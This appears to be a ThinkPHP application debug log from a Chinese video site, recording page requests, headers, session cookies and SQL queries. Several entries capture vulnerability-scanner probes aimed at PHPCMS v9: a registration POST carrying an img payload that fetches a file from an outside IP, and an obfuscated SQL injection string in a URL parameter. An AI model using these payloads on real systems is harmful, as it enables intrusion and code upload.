+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000155s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000151s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000484s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000405s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000102s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000449s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000106s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000457s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000150s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000111s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000134s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:20+08:00 ] 111.206.170.62 GET /index/user/person
+[ info ] tp.chenjiangjiang.cn/index/user/person [运行时间：0.030486s][吞吐率：32.80req/s] [内存消耗：2,685.53kb] [文件加载：60]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'person',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=http://tp.chenjiangjiang.cn/index/user/login',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/index/index.html',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\User->person[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/user/person.html [ array (
+  0 => 'data3',
+  1 => 'data2',
+  2 => 'data4',
+  3 => 'wzxx',
+  4 => 'data',
+  5 => 'data1',
+  6 => 'jl',
+  7 => 'info',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000207s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000622s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000131s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000122s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000462s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000103s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000421s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0' [ RunTime:0.000114s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_user` [ RunTime:0.000463s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_user` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000237s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_fwjl` [ RunTime:0.000417s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_fwjl` WHERE  `uid` = 10 ORDER BY `retime`  desc LIMIT 5 [ RunTime:0.000233s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_user` WHERE  `id` = 10 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_vip` [ RunTime:0.000415s ]
+[ sql ] [ SQL ] SELECT `gqtime` FROM `bw_vip` WHERE  `uid` = 10 LIMIT 1 [ RunTime:0.000126s ]
+[ sql ] [ SQL ] UPDATE `bw_user`  SET `isvip`=2  WHERE  `id` = 10 [ RunTime:0.004295s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:21+08:00 ] 111.206.170.62 GET /index/user/chaqiandao
+[ info ] tp.chenjiangjiang.cn/index/user/chaqiandao [运行时间：0.018197s][吞吐率：54.95req/s] [内存消耗：2,312.43kb] [文件加载：51]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'chaqiandao',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=http://tp.chenjiangjiang.cn/index/user/login',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/user/person',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\User->chaqiandao[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000206s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_sign` [ RunTime:0.000628s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_sign` WHERE  `uid` = 10 LIMIT 1 [ RunTime:0.000222s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:21+08:00 ] 111.206.170.62 GET /index/user/qiandao
+[ info ] tp.chenjiangjiang.cn/index/user/qiandao [运行时间：0.017821s][吞吐率：56.11req/s] [内存消耗：2,312.51kb] [文件加载：51]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'qiandao',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=http://tp.chenjiangjiang.cn/index/user/login',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/user/person',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\User->qiandao[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000181s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_sign` [ RunTime:0.000537s ]
+[ sql ] [ SQL ] SELECT `qdtime` FROM `bw_sign` WHERE  `uid` = 10 ORDER BY `qdtime`  desc LIMIT 1 [ RunTime:0.000230s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:47:31+08:00 ] 140.205.225.204 POST /index.php?m=member&c=index&a=register&siteid=1
+[ info ] tp.chenjiangjiang.cn:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.024569s][吞吐率：40.70req/s] [内存消耗：2,595.21kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'tp.chenjiangjiang.cn:80',
+  'content-length' => '171',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'HIulxoda',
+  'password' => 'HIulxoda',
+  'email' => 'HIulxoda@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000214s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000677s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000152s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000434s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000146s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000420s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000440s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000106s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000446s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000113s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000111s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:47:33+08:00 ] 140.205.225.204 GET /index.php?m=wap&a=index&siteid=1
+[ info ] tp.chenjiangjiang.cn:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.024418s][吞吐率：40.95req/s] [内存消耗：2,594.05kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'host' => 'tp.chenjiangjiang.cn:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000187s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000638s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000156s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000453s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000407s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000442s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000106s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000468s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000127s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000128s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:47:33+08:00 ] 140.205.225.204 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] tp.chenjiangjiang.cn:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.024068s][吞吐率：41.55req/s] [内存消耗：2,594.44kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'tp.chenjiangjiang.cn:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000195s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000612s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000169s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000132s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000457s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000127s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000405s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000432s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000106s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000465s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000154s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000133s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000123s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:47:33+08:00 ] 140.205.225.204 GET /index.php?m=content&c=down&a_k=
+[ info ] tp.chenjiangjiang.cn:80/index.php?m=content&c=down&a_k= [运行时间：0.024004s][吞吐率：41.66req/s] [内存消耗：2,594.05kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'tp.chenjiangjiang.cn:80',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000181s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000610s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000150s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000428s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000408s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000448s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000104s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000442s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000112s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000132s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:49:22+08:00 ] 111.206.170.62 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.025162s][吞吐率：39.74req/s] [内存消耗：2,594.02kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000201s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000647s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000450s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000140s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000410s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
